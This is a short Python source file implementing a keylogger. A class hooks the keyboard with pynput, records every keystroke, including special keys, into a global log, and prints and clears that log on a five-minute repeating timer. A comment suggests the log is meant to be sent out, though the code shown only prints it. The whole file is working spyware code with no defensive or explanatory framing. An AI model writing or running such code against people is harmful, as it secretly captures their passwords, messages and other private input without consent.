#!/usr/bin/env python
import pynput.keyboard
import threading

# global log variable in order not to send each letter
log = ""


class PaKey:

    # process to catch keystrokes

    def process_key_press(self, key):
        global log
        try:
            log = log + str(key.char)
        except AttributeError:
            if key == key.space:
                log = log + " "
            else:
                log = log + " " + str(key) + " "

    def reporter(self):
        global log
        print(log)
        log = ""
        timer = threading.Timer(300, self.reporter)  # timer to count sec and internal call reporter for new
        timer.start()

    def start(self):
        # in order to listen keystrokes from the keyboard

        keyboardListener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboardListener:
            self.reporter()
            keyboardListener.join()
